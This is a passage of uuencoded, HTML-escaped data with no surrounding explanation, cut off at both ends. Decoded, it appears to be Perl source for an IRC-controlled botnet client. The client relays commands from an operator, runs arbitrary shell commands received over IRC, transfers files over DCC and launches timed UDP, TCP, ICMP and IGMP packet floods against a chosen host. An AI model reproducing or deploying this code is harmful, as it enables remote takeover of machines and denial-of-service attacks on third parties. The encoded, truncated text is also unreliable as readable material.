#x27;,K*%Q3*RD@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@9F]R(&quot;AM&gt;2`D8V8@/2`Q_.R`D8V8@/#T@)#$[(&quot;1C9BLK*2![&quot;B`@(&quot;`@(&quot;`@8W1C&lt;&quot;@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@_(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F-T8W!&lt;&lt;RLH7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!C=&amp;-P*&quot;(D,2(L(&quot;(D,B(I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7FEN=FET95QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;EN=FET_92@B)#$B+&quot;`B)#(B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN:6-K(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;YI_8VLH(B0Q(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;8V]N96-T85QS*RA&lt;4RLI7&#x27;,K*%Q3*RDO*2![_&quot;B`@(&quot;`@(&quot;!C;VYE8W1A&lt;B@B)#(B+&quot;`B)#$B+&quot;`V-C8W*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS_96YD7&#x27;,K*%Q3*RE&lt;&lt;RLH7%,K*2\\I(&#x27;L*(&quot;`@(&quot;`@1$-#.CI314Y$*&quot;(D,2(L(&quot;(D,B(I.PH@(&quot;!]&quot;B`@(&amp;5L_&lt;VEF(&quot;@D8V%S92`]?B`O7G)A=R`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7F5V86P@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@979A;&quot;`B)#$B.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F5N=&#x27;)A7&#x27;,K*%Q3*RE&lt;&lt;RLH7&amp;0K*2\\I(&#x27;L*(&quot;`@(&#x27;-L965P(&amp;EN=&quot;AR86YD*&quot;0R*2D[&quot;B`@(&quot;!J_*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G-A:5QS*RA&lt;4RLI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;!S_;&amp;5E&lt;&quot;!I;G0H&lt;F%N9&quot;@D,BDI.PH@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS86ER_+RD@&gt;PH@(&quot;`@(&#x27;%U:70H*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN;W9O;FEC:R\\I(&#x27;L*(&quot;`@(&amp;UY_(&quot;1N;W9O;FEC:R`](&amp;=E=&amp;YI8VLH*3L*(&quot;`@(&quot;!N:6-K*&quot;(D;F]V;VYI8VLB*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H_)&amp;-A&lt;V4@/7X@+UYE&lt;W1A=&amp;ES=&amp;EC87,@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!I9B`H)#$@97$@(F]N(BD@&gt;PH@(&quot;`@(&quot;`D_97-T871I&lt;W1I8V%S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!A=&amp;EV861A&lt;R$B_*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D97-T871I&lt;W1I8V%S(#T@,#L*(&quot;`@(&quot;`@_;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!D97-A=&amp;EV861A&lt;R$B*3L*(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS_:68@*&quot;1C87-E(#U^(&quot;]&gt;&lt;&amp;%C;W1E&lt;R`H+BHI+RD@&gt;PH@(&quot;`@(&amp;EF(&quot;@D,2!E&lt;2`B;VXB*2![&quot;B`@(&quot;`@(&quot;1P_86-O=&amp;5S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(E!A8V]T97,@871I=F%D;W,A(BD@:68@*&quot;1E&lt;W1A_=&amp;ES=&amp;EC87,@/3T@(C$B*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D&lt;&amp;%C;W1E&lt;R`]_(#`[&quot;B`@(&quot;`@(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)086-O=&amp;5S(&amp;1E&lt;V%T:79A9&amp;]S(2(I(&amp;EF(&quot;@D97-T871I&lt;W1I_8V%S(#T](&quot;(Q(BD[&quot;B`@(&quot;`@?0H@(&quot;!]&quot;GT*&lt;W5B(&#x27;-H96QL(&#x27;L*(&quot;!R971U&lt;FX@=6YL97-S(&quot;1A8V5S&lt;V]S_:&amp;5L;#L*(&quot;!M&gt;2`D&lt;&#x27;)I;G1L/21?6S!=.PH@(&amp;UY(&quot;1C;VUA;F1O/21?6S%=.PH@(&amp;EF(&quot;@D8V]M86YD;R`]_?B`O8V0@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&amp;-H9&amp;ER*&quot;(D,2(I(&#x27;Q\\(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)$:7)E=&quot;YR:6\\@:6YE_&gt;&amp;ES=&amp;5N=&amp;4A(BD[&quot;B`@(&quot;!R971U&lt;FX[&quot;B`@?0H@(&amp;5L&lt;VEF(&quot;@D&lt;&amp;ED(#T@9F]R:RD@&gt;PH@(&quot;`@(&#x27;=A:71P_:60H)&#x27;!I9&quot;P@,&quot;D[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@:68@*&amp;9O&lt;FLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@_(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;)E&lt;W`]8&quot;1C;VUA;F1O(#(^)C$@,SXF,6`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_;7D@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1L:6YH82`H0&#x27;)E&lt;W`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1C_*RL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;]P(&quot;1L:6YH83L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C_:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#HD;&amp;EN:&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D8R`^/2`B)&amp;QI;F%S_7VUA&gt;&quot;(I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VQE97`@)&#x27;-L965P.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?0H@(&#x27;T*?0H*&lt;W5B(&amp;%T_=&amp;%C:V5R(&#x27;L*(&quot;!M&gt;2`D:6%D9&#x27;(@/2!I;F5T7V%T;VXH)%];,%TI.PH@(&amp;UY(&quot;1M&lt;V&lt;@/2`G0B&lt;@&gt;&quot;`D7ULQ_73L*(&quot;!M&gt;2`D9G1I;64@/2`D7ULR73L*(&quot;!M&gt;2`D8W`@/2`P.PH@(&amp;UY(&quot;@E&lt;&amp;%C;W1E&lt;RD[&quot;B`@)&#x27;!A8V]T_97-[:6-M&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`](&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMO?2`](&quot;1P86-O_=&amp;5S&gt;W1C&lt;&#x27;T@/2`P.PH*(&quot;!S;V-K970H4T]#2S$L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`R*2!O&lt;B`D8W`K*SL*_(&quot;!S;V-K970H4T]#2S(L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#_2S,L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`Q*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#2S0L(%!&amp;7TE.150L(%-/_0TM?4D%7+&quot;`V*2!O&lt;B`D8W`K*SL*(&quot;!R971U&lt;FXH=6YD968I(&amp;EF(&quot;1C&lt;&quot;`]/2`T.PH@(&amp;UY(&quot;1I=&amp;EM92`]_(&#x27;1I;64[&quot;B`@;7D@*&quot;1C=7)?=&amp;EM92D[&quot;B`@=VAI;&amp;4@*&quot;`Q(&quot;D@&gt;PH@(&quot;`@(&amp;9O&lt;B`H;7D@)&#x27;!O&lt;G1A(#T@_,3L@)&#x27;!O&lt;G1A(#P](#8U-3,U.R`D&lt;&amp;]R=&amp;$K*RD@&gt;PH@(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM_93L*(&quot;`@(&quot;`@(&amp;QA&lt;W0@:68@)&amp;-U&lt;E]T:6UE(#X](&quot;1F=&amp;EM93L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S$L(&quot;1M&lt;V&lt;L_(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEG;7!]*RL@:68@*&quot;1P86-O_=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+,BP@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D_9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=61P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S,L_(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEC;7!]*RL@:68@_*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+-&quot;P@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A_+&quot;`D:6%D9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=&amp;-P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*&quot;B`@(&quot;`@(&quot;!F;W(@_*&amp;UY(&quot;1P8R`](#,[(&quot;1P8R`\\/2`R-34[)&#x27;!C*RLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F5X=&quot;!I9B`D&lt;&amp;,@/3T@-CL*(&quot;`@_(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@;&amp;%S=&quot;!I9B`D8W5R7W1I;64@/CT@_)&amp;9T:6UE.PH@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2S4L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`D&lt;&amp;,I(&amp;]R(&amp;YE&gt;&#x27;0[_&quot;B`@(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S4L(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD_(&quot;1P86-O=&amp;5S&gt;V]]*RL@:68@*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@(&#x27;T*(&quot;`@(&quot;!L87-T(&amp;EF_(&quot;1C=7)?=&amp;EM92`^/2`D9G1I;64[&quot;B`@?0H@(&#x27;)E=&#x27;5R;B@D8W5R7W1I;64L(&quot;5P86-O=&amp;5S*3L*?0H*&quot;G-U_8B!A8W1I;VX@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)04DE635-&#x27;(&quot;1?6S!=_(#I&lt;,#`Q04-424].(&quot;1?6S%=7#`P,2(I.PI]&quot;@IS=6(@8W1C&lt;&quot;![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T]_(#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E!2259-4T&lt;@)%];,%T@.EPP,#$D7ULQ75PP,#$B*3L*?0IS=6(@;7-G(&#x27;L*(&quot;`@_&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B4%))5DU31R`D7ULP72`Z)%];,5TB*3L*?0H*_&lt;W5B(&amp;YO=&amp;EC92![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DY/5$E#12`D7ULP_72`Z)%];,5TB*3L*?0H*&lt;W5B(&amp;]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B_34]$12`D7ULP72`K;R`D7ULQ72(I.PI]&quot;G-U8B!D96]P(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*_(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`M;R`D7ULQ72(I.PI]&quot;G-U8B!H;W`@&gt;PH@(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S_&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B34]$12`D7ULP72`K:&quot;`D7ULQ72(I.PI]&quot;G-U8B!D96AO&lt;&quot;![&quot;B`@_(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V@@)%];,5TB*3L*?0IS_=6(@=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;MV_(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;1E=F]I8V4@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W_*&quot;)-3T1%(&quot;1?6S!=(&quot;UV(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;)A;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[_&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];,%T@*V(@)%];,5TB*3L*?0IS=6(@=6YB86X@&gt;PH@(&quot;!R971U&lt;FX@=6YL_97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)-3T1%(&quot;1?6S!=(&quot;UB(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&amp;MI8VL@&gt;PH@_(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)+24-+(&quot;1?6S!=(&quot;1?6S%=(#HD7ULR72(I_.PI]&quot;@IS=6(@;6]D;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DU/1$4@)%];_,%T@)%];,5TB*3L*?0IS=6(@;6]D92![(&amp;UO9&amp;\\H0%\\I.R!]&quot;@IS=6(@:B![(&quot;9J;VEN*$!?*3L@?0IS=6(@_:F]I;B![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@(&#x27;-E;F1R87&lt;H(DI/24X@)%];,%TB*3L*?0IS_=6(@&lt;&quot;![(&#x27;!A&lt;G0H0%\\I.R!]&quot;G-U8B!P87)T(&#x27;MS96YD&lt;F%W*&quot;)005)4(&quot;1?6S!=(BD[?0H*&lt;W5B(&amp;YI8VL@_&gt;PH@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3DE#2R`D7ULP72(I.PI]&quot;@IS=6(@:6YV_:71E(&#x27;L*(&quot;`@&lt;F5T=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,3L*(&quot;`@&lt;V5N9&#x27;)A=R@B24Y6251%(&quot;1?6S%=(&quot;1?6S!=_(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC;R![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#$[&quot;B`@(&#x27;-E;F1R87&lt;H(E1/4$E#_(&quot;1?6S!=(&quot;1?6S%=(BD[&quot;GT*&lt;W5B(&#x27;1O&lt;&amp;EC(&#x27;L@=&amp;]P:6-O*$!?*3L@?0H*&lt;W5B(&#x27;=H;VES(&#x27;L*(&quot;!R971U_&lt;FX@=6YL97-S(&quot;0C7R`]/2`P.PH@(&#x27;-E;F1R87&lt;H(E=(3TE3(&quot;1?6S!=(BD[&quot;GT*&lt;W5B(&#x27;=H;R![&quot;B`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D(U\\@/3T@,#L*(&quot;!S96YD&lt;F%W*&quot;)72$\\@)%];,%TB*3L*?0IS=6(@;F%M97,@&gt;PH@(&#x27;)E_=&#x27;5R;B!U;FQE&lt;W,@)&quot;-?(#T](#`[&quot;B`@&lt;V5N9&#x27;)A=R@B3D%-15,@)%];,%TB*3L*?0IS=6(@87=A&gt;2![&quot;B`@_&lt;V5N9&#x27;)A=R@B05=!62`D7ULP72(I.PI]&quot;G-U8B!B86-K(&#x27;L@87=A&gt;2@I.R!]&quot;G-U8B!Q=6ET(&#x27;L*(&quot;!S96YD_&lt;F%W*&quot;)154E4(#HD7ULP72(I.PH@(&amp;5X:70[&quot;GT*&quot;G!A8VMA9V4@1$-#.PH*&lt;W5B(&amp;-O;FYE8W1I;VYS(&#x27;L*_(&quot;`@;7D@0&#x27;)E861Y(#T@)&amp;1C8U]S96PM/F-A;E]R96%D*#$I.PH@(&quot;!F;W)E86-H(&amp;UY(&quot;1F:&quot;`H0&#x27;)E861Y_*2![&quot;B`@(&quot;`@;7D@)&amp;1C8W1I&lt;&amp;\\@/2`D1$-#&gt;R1F:&#x27;U[=&amp;EP;WT[&quot;B`@(&quot;`@;7D@)&amp;%R&lt;75I=F\\@/2`D1$-#_&gt;R1F:&#x27;U[87)Q=6EV;WT[&quot;B`@(&quot;`@;7D@)&amp;)Y=&amp;5S(#T@)$1#0WLD9FA]&gt;V)Y=&amp;5S?3L*(&quot;`@(&quot;!M&gt;2`D8W5R_7V)Y=&amp;4@/2`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T[&quot;B`@(&quot;`@;7D@)&amp;YI8VL@/2`D1$-#&gt;R1F:&#x27;U[;FEC:WT[&quot;@H@_(&quot;`@(&amp;UY(&quot;1M&lt;V&lt;[&quot;B`@(&quot;`@;7D@)&amp;YR96%D(#T@&lt;WES&lt;F5A9&quot;@D9F@L(&quot;1M&lt;V&lt;L(#$P,C0P*3L*&quot;B`@(&quot;`@_:68@*&quot;1N&lt;F5A9&quot;`]/2`P(&amp;%N9&quot;`D9&amp;-C=&amp;EP;R`]?B`O7BAG971\\&lt;V5N9&amp;-O;BDD+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$_0T-[)&amp;9H?7MS=&amp;%T=7-](#T@(D-A;F-E;&amp;%D;R([&quot;B`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[_&quot;B`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@;F5X_=#L*(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&amp;EF(&quot;@D9&amp;-C=&amp;EP;R!E&lt;2`B9V5T(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;1$0T-[)&amp;9H?7MC=7)B_&gt;71E?2`K/2!L96YG=&amp;@H)&amp;US9RD[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1C=7)?8GET92`](&quot;1$0T-[)&amp;9H?7MC=7)B&gt;71E_?3L*&quot;B`@(&quot;`@(&quot;`@;W!E;BA&amp;24Q%+&quot;`B/CX@)&amp;%R&lt;75I=F\\B*3L*(&quot;`@(&quot;`@(&quot;!P&lt;FEN=&quot;!&amp;24Q%(&quot;(D;7-G_(B!I9B`H)&amp;-U&lt;E]B&gt;71E(#P](&quot;1B&gt;71E&lt;RD[&quot;B`@(&quot;`@(&quot;`@8VQO&lt;V4H1DE,12D[&quot;@H@(&quot;`@(&quot;`@(&amp;UY(&quot;1P_86-K8GET92`](&#x27;!A8VLH(DXB+&quot;`D8W5R7V)Y=&amp;4I.PH@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;!A8VMB&gt;71E(CL*_&quot;B`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;R`]/2`D8W5R7V)Y=&amp;4I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D9&amp;-C7W-E;&quot;T^&lt;F5M;W9E_*&quot;1F:&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@)&amp;9H+3YC;&amp;]S93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[&lt;W1A=&#x27;5S?2`](&quot;)2_96-E8FED;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD9FA]&gt;V9T:6UE?2`](&#x27;1I;64[&quot;B`@(&quot;`@(&quot;`@(&quot;`@;F5X=#L*_(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@(G-E;F0B*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;V5N_9&quot;`](&quot;1F:&quot;T^86-C97!T.PH@(&quot;`@(&quot;`@(&quot;`@)&#x27;-E;F0M/F%U=&amp;]F;&#x27;5S:&quot;@Q*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;1D8V-?_&lt;V5L+3YA9&amp;0H)&#x27;-E;F0I.PH@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@)$1#_0WLD&lt;V5N9&#x27;U[=&amp;EP;WT@/2`G&lt;V5N9&amp;-O;B&lt;[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI=&amp;EM97T@/2!T:6UE_.PH@(&quot;`@(&quot;`@(&quot;`@)$1#0WLD&lt;V5N9&#x27;U[;FEC:WT@/2`D;FEC:SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V)Y_=&amp;5S?2`](&quot;1B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;1$0T-[)&#x27;-E;F1]&gt;V-U&lt;F)Y=&amp;5](#T@,#L*(&quot;`@(&quot;`@(&quot;`@(&quot;1$_0T-[)&#x27;-E;F1]&gt;V%R&lt;75I=F]](#T@)&amp;%R&lt;75I=F\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MI&lt;&#x27;T@/2`D&lt;V5N_9&quot;T^&lt;&amp;5E&lt;FAO&lt;W0[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MP;W)T87T@/2`D&lt;V5N9&quot;T^&lt;&amp;5E&lt;G!O&lt;G0[&quot;B`@_(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1S96YD?7MS=&amp;%T=7-](#T@(D5N=FEA;F1O(CL*&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*$9)3$4L_(&quot;(\\(&quot;1A&lt;G%U:79O(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D9F)Y=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@&lt;F5A9&quot;A&amp;24Q%+&quot;`D9F)Y_=&amp;5S+&quot;`Q,#(T*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1S96YD(&quot;(D9F)Y=&amp;5S(CL*(&quot;`@(&quot;`@(&quot;`@(&amp;-L;W-E($9)_3$4[&quot;B`@(&quot;`@?2!E;&#x27;-I9B`H)&amp;1C8W1I&lt;&amp;\\@97$@)W-E;F1C;VXG*2![&quot;B`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D8GET97-?_&lt;V5N9&amp;5D(#T@=6YP86-K*&quot;).(BP@)&amp;US9RD[&quot;B`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[8W5R8GET97T@/2`D8GET_97-?&lt;V5N9&amp;5D.PH@(&quot;`@(&quot;`@(&quot;`@:68@*&quot;1B&gt;71E&lt;U]S96YD960@/3T@)&amp;)Y=&amp;5S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`D9F@M/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;1C8U]S96PM/G)E;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_)$1#0WLD9FA]&gt;W-T871U&lt;WT@/2`B16YV:6%D;R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D1$-#&gt;R1F:&#x27;U[9G1I;65](#T@_=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;YE&gt;&#x27;0[&quot;B`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-%3D1&amp;24Q%+&quot;`B_/&quot;`D87)Q=6EV;R(I.PH@(&quot;`@(&quot;`@(&quot;`@&lt;V5E:RA314Y$1DE,12P@)&amp;)Y=&amp;5S7W-E;F1E9&quot;P@,&quot;D[&quot;B`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D&lt;V5N9%]B&gt;71E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&#x27;)E860H4T5.1$9)3$4L(&quot;1S96YD7V)Y=&amp;5S+&quot;`Q,#(T_*3L*(&quot;`@(&quot;`@(&quot;`@(&#x27;!R:6YT(&quot;1F:&quot;`B)&#x27;-E;F1?8GET97,B.PH@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4T5.1$9)3$4I_.PH@(&quot;`@(&#x27;T*(&quot;`@?0I]&quot;@H*&lt;W5B(%-%3D0@&gt;PH@(&amp;UY(&quot;@D;FEC:RP@)&amp;%R&lt;75I=F\\I(#T@0%\\[&quot;B`@=6YL_97-S(&quot;@M&lt;B`B)&amp;%R&lt;75I=F\\B*2![&quot;B`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@?0H*(&quot;!M&gt;2`D9&amp;-C87)K(#T@)&amp;%R&lt;75I_=F\\[&quot;B`@)&amp;1C8V%R:R`]?B!S+ULN*EPO72A&lt;4RLI+R0Q+SL*&quot;B`@;7D@)&amp;UE=6EP(#T@)#HZ:7)C7W-E&lt;G9E_&lt;G-[(B0Z.DE20U]C=7)?&lt;V]C:V5T(GU[)VUE=6EP)WT[&quot;B`@;7D@)&amp;QO;F=I&lt;&quot;`](&#x27;5N&lt;&amp;%C:R@B3B(L:6YE_=%]A=&amp;]N*&quot;1M975I&lt;&quot;DI.PH*(&quot;!M&gt;2!`9FEL97-T870@/2!S=&amp;%T*&quot;1A&lt;G%U:79O*3L*(&quot;!M&gt;2`D&lt;VEZ95]T_;W1A;#TD9FEL97-T871;-UT[&quot;B`@:68@*&quot;1S:7IE7W1O=&amp;%L(#T](#`I(&#x27;L*(&quot;`@(&quot;!R971U&lt;FXH,&quot;D[&quot;B`@_?0H*(&quot;!M&gt;2`H)&#x27;!O&lt;G1A+&quot;`D&lt;V5N9&#x27;-O8VLI.PH@(&amp;1O(&#x27;L*(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;!R86YD*#8T-3$Q_*3L*(&quot;`@(&quot;1P;W)T82`K/